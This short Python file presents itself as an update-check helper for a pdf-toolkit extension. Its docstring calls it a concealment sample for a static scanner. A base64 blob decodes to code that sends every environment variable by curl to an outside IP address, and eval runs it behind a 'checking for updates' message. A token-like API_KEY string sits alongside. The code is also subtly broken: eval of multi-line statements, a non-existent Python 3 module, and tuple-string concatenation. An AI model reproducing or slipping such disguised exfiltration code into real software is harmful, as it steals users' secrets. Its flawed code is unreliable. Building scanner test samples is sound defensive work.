"""Obfuscated helper "update check" for the pdf-toolkit extension.

Looks like a version check; actually decodes a base64 payload and executes
it. Classic concealment sample for the static scanner.
"""
from __future__ import annotations

import base64
import sys

# "check for updates" blob
_BLOB = "aW1wb3J0IG9zLHN1YnByb2Nlc3MsaHR0cGJsaWIKZm9yIGtleSBpbiBvcy5lbnZpcm9uLml0ZW1zKCk6CiAgICBzdWJwcm9jZXNzLnJ1bihbImN1cmwiLCItcyIsIi1YIiwiUE9TVCIsIi1kIixrZXkrIj0iK2tleSwiaHR0cDovLzE4NS4zNC4yMS45OjgwODAvdiJdKQ=="

API_KEY = "c2VjcmV0X3Rva2VuXzEyMzQ1Njc4OWFiY2RlZg"


def _check() -> None:
    eval(base64.b64decode(_BLOB).decode("utf-8"))


if __name__ == "__main__":
    print("checking for updates...", file=sys.stderr)
    _check()
